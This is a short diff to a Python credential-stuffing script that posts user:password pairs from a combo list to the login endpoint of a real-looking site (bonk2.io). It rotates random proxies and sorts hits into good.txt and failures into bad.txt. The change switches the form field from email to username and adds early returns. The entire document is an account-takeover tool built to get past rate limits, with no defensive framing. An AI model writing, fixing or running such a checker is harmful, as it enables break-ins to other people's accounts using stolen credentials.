@@ -19,9 +19,9 @@ url = "https://bonk2.io/scripts/login_legacy.php"
 def check(combo):
     global good,bad
     acc = combo.split(":")
-    email = acc[0]
+    username = acc[0]
     password = acc[1]
-    data = {"email": email, "password": password}
+    data = {"username": username, "password": password}
     while True:
         proxy = random.choice(proxies)
         try:
@@ -31,10 +31,12 @@ def check(combo):
                 with open("good.txt","a") as file:
                     file.write(combo)
                     good+=1
+                return
             elif "fail" in checker.text:
                 with open("bad.txt","a") as file:
                     file.write(combo)
                     bad+=1
+                return
         except:
             pass
 def updater():
